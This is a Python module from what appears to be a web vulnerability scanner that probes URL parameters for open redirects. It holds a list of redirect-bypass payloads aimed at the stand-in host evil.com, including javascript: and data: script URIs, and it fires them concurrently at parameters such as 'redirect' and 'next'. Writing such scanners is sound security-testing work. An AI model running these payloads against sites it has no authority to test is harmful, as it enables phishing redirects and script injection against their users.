"""
Open Redirect Testing Module
"""

import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .utils import HTTPClient

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "/\\evil.com",
    "https:evil.com",
    "https:/evil.com",
    "//%0aevil.com",
    "https://evil.com%2f@legitimate.com",
    "https://legitimate.com@evil.com",
    "https://evil.com?legitimate.com",
    "https://evil.com#legitimate.com",
    "%2F%2Fevil.com",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
]

REDIRECT_PARAMS = [
    'redirect', 'url', 'next', 'return', 'returnUrl', 'returnTo',
    'goto', 'destination', 'dest', 'to', 'back', 'redir', 'location',
    'target', 'ref', 'referer', 'callback', 'continue', 'forward',
]


class OpenRedirectTester:
    def __init__(self, config):
        self.http    = HTTPClient(config)
        self.threads = config.get('threads', 20)
        self.results = []

    def run(self, target, urls):
        print(f"    [~] Testing Open Redirects on {len(urls)} URLs...")
        endpoints = self._extract_redirect_params(urls, target)
        print(f"    [~] {len(endpoints)} redirect-like params found")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(self._test, ep) for ep in endpoints]
            for f in concurrent.futures.as_completed(futures):
                res = f.result()
                if res:
                    self.results.extend(res)
        return self.results

    def _extract_redirect_params(self, urls, target):
        endpoints = []
        base = f"https://{target}" if not target.startswith('http') else target
        for url in urls:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for param, vals in qs.items():
                if param.lower() in REDIRECT_PARAMS:
                    endpoints.append((url, param, vals[0] if vals else ''))
        if not endpoints:
            for p in REDIRECT_PARAMS[:3]:
                endpoints.append((f"{base}?{p}=https://example.com", p, 'https://example.com'))
        return endpoints

    def _test(self, endpoint):
        url, param, orig = endpoint
        findings = []
        for payload in REDIRECT_PAYLOADS:
            injected = self._inject(url, param, payload)
            resp = self.http.get(injected, allow_redirects=False)
            if not resp:
                continue
            if resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get('Location', '')
                if 'evil.com' in loc or loc.startswith('//') or loc.startswith('/\\'):
                    print(f"    [VULN] Open Redirect @ {url} param={param} → {loc}")
                    findings.append({
                        'type':        'Open Redirect',
                        'technique':   'URL Redirect',
                        'url':         url,
                        'parameter':   param,
                        'payload':     payload,
                        'evidence':    f"Redirected to: {loc}",
                        'severity':    'Medium',
                        'remediation': 'Validate redirect destinations against a whitelist of allowed URLs.',
                        'cvss':        '6.1',
                        'cwe':         'CWE-601',
                    })
                    break
        return findings

    def _inject(self, url, param, value):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
